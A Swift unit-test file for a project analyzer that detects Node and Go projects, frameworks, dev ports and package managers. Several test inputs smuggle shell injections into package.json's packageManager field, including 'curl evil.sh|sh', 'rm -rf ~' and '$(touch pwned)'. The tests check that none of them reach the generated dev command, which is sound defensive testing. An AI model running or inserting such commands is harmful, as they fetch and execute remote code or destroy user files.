import Foundation
import Testing

@testable import Core

struct NodeAnalysisTests {
    @Test func nodeProjectUsesFolderNameNotPackageName() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name":"@acme/totally-different"}"#, to: "my-app/package.json")

        let analysis = try ProjectAnalyzer().analyze(path: dir.path + "/my-app")

        #expect(analysis.name == "my-app")
    }

    @Test func nodeProjectDefaultsToCommandRuntimeWithoutPHP() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name":"app"}"#, to: "package.json")

        let analysis = try ProjectAnalyzer().analyze(path: dir.path)

        #expect(analysis.runtimeKind == .command)
        #expect(analysis.phpVersion == nil)
    }

    @Test func analysisNormalizesThePath() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name":"x"}"#, to: "shop/package.json")
        try dir.makeDirectory("a")
        let analyzer = ProjectAnalyzer()
        let canonical = try analyzer.analyze(path: dir.path + "/shop").path
        #expect(try analyzer.analyze(path: dir.path + "/shop/").path == canonical)
        #expect(try analyzer.analyze(path: dir.path + "/a/../shop").path == canonical)
        try FileManager.default.createSymbolicLink(
            atPath: dir.path + "/link", withDestinationPath: dir.path + "/shop")
        #expect(try analyzer.analyze(path: dir.path + "/link").path == canonical)
    }

    @Test func invalidPackageJSONNamesTheFile() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name": "x",}"#, to: "package.json")

        let error = #expect(throws: AnalysisError.self) {
            try ProjectAnalyzer().analyze(path: dir.path)
        }

        guard case .invalidManifest(let path, _) = error else {
            Issue.record("expected invalidManifest, got \(String(describing: error))")
            return
        }
        #expect(path.hasSuffix("/package.json"))
    }

    @Test(
        arguments: [
            (#"{"devDependencies":{"next":"14"}}"#, "nextjs", 3000),
            (#"{"dependencies":{"astro":"4"}}"#, "astro", 4321),
            (#"{"dependencies":{"vite":"5"},"scripts":{"dev":"vite --port 5199"}}"#, "vite", 5199),
            (#"{"dependencies":{"express":"4"},"scripts":{"start":"node x --port=4100"}}"#, "express", 4100),
        ] as [(String, String, Int)])
    func frameworkAndPort(manifest: String, framework: String, port: Int) throws {
        let dir = try TemporaryDirectory()
        try dir.write(manifest, to: "package.json")

        let analysis = try ProjectAnalyzer().analyze(path: dir.path)

        #expect(analysis.framework == framework)
        #expect(analysis.devPort == port)
    }

    @Test(
        arguments: [
            ("pnpm-lock.yaml", nil, "pnpm", "pnpm run dev"),
            ("bun.lockb", nil, "bun", "bun run dev"),
            ("yarn.lock", nil, "yarn", "yarn dev"),
            ("package-lock.json", nil, "npm", "npm run dev"),
            (nil, "pnpm@9.1.0", "pnpm", "pnpm run dev"),
            (nil, "yarn@4.1.0", "yarn", "yarn dev"),
            (nil, "npm; curl evil.sh|sh #@1", "npm", "npm run dev"),
            ("pnpm-lock.yaml", "rm -rf ~ #@1", "pnpm", "pnpm run dev"),
            (nil, "$(touch pwned)", "npm", "npm run dev"),
        ] as [(String?, String?, String, String)])
    func packageManager(lockfile: String?, declared: String?, manager: String, command: String) throws {
        let dir = try TemporaryDirectory()
        let declaration = declared.map { #","packageManager":"\#($0)""# } ?? ""
        try dir.write(#"{"name":"x"\#(declaration)}"#, to: "package.json")
        if let lockfile {
            try dir.write("", to: lockfile)
        }

        let analysis = try ProjectAnalyzer().analyze(path: dir.path)

        #expect(analysis.packageManager == manager)
        #expect(analysis.devCommand == command)
    }

    @Test func aHostilePackageManagerDeclarationNeverReachesTheDevCommand() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name":"x","packageManager":"npm; curl evil.sh|sh #@1"}"#, to: "package.json")

        let command = try #require(try ProjectAnalyzer().analyze(path: dir.path).devCommand)

        #expect(!command.contains(";"))
        #expect(!command.contains("|"))
        #expect(!command.contains("$("))
        #expect(command.split(separator: " ") == ["npm", "run", "dev"])
    }

    @Test func goModuleIsAGoProject() throws {
        let dir = try TemporaryDirectory()
        try dir.write("module example.com/app\n", to: "go.mod")

        let analysis = try ProjectAnalyzer().analyze(path: dir.path)

        #expect(analysis.framework == "go")
        #expect(analysis.packageManager == "go modules")
        #expect(analysis.devCommand == "go run main.go")
        #expect(analysis.devPort == 8080)
    }

    @Test func unknownNodeFrameworkIsNil() throws {
        let dir = try TemporaryDirectory()
        try dir.write(#"{"name":"x"}"#, to: "package.json")

        let analysis = try ProjectAnalyzer().analyze(path: dir.path)

        #expect(analysis.framework == nil)
        #expect(analysis.devCommand == "npm run dev")
    }

    @Test func emptyPathIsRejected() {
        let error = #expect(throws: AnalysisError.self) {
            try ProjectAnalyzer().analyze(path: "  ")
        }

        #expect(error == .emptyPath)
    }

    @Test func aFileIsNotADirectory() throws {
        let dir = try TemporaryDirectory()
        try dir.write("x", to: "file.txt")

        let error = #expect(throws: AnalysisError.self) {
            try ProjectAnalyzer().analyze(path: dir.path + "/file.txt")
        }

        guard case .notADirectory = error else {
            Issue.record("expected notADirectory, got \(String(describing: error))")
            return
        }
    }

    @Test func folderWithoutManifestIsUnsupported() throws {
        let dir = try TemporaryDirectory()

        let error = #expect(throws: AnalysisError.self) {
            try ProjectAnalyzer().analyze(path: dir.path)
        }

        guard case .noSupportedProject = error else {
            Issue.record("expected noSupportedProject, got \(String(describing: error))")
            return
        }
    }
}
